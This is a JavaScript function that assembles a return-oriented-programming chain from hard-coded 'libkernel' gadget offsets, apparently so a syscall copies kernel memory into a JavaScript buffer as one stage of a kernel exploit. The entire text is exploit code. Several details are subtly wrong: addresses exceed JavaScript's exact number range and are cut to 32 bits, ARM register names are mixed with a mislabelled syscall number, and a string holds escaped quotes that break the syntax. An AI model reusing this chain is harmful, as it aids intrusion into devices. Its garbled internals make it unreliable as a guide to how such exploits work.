function setupROP() {
  ropChain = new Uint32Array(0x400);
  let i = 0;

  const LIBKERNEL_BASE = 0xFFFFFFFF82600000;

  const GADGET_POP_X0 = LIBKERNEL_BASE + 0x1A2FFC;
  const GADGET_POP_X1 = LIBKERNEL_BASE + 0x1A3020;
  const GADGET_POP_X2 = LIBKERNEL_BASE + 0x1A3040;
  const GADGET_POP_X3 = LIBKERNEL_BASE + 0x1A3060;
  const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;

  const SYSCALL_COPYOUT = 0x3B;
  const KERNEL_SRC = LIBKERNEL_BASE;                 // Try leaking start of libkernel
  const JS_DEST = 0x133713370300;                    // Known offset in JS memory
  const COPY_LEN = 8;

  // x0 = syscall number
  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = SYSCALL_COPYOUT;

  // x1 = kernel src address
  ropChain[i++] = GADGET_POP_X1 & 0xFFFFFFFF;
  ropChain[i++] = KERNEL_SRC & 0xFFFFFFFF;

  // x2 = user dest buffer
  ropChain[i++] = GADGET_POP_X2 & 0xFFFFFFFF;
  ropChain[i++] = JS_DEST;

  // x3 = length
  ropChain[i++] = GADGET_POP_X3 & 0xFFFFFFFF;
  ropChain[i++] = COPY_LEN;

  // syscall
  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;
  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = 0xDEAD; // Invalid syscall

  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;
  debug_log(\"ROP chain (copyout) initialized.\");
  return ropChain;
}
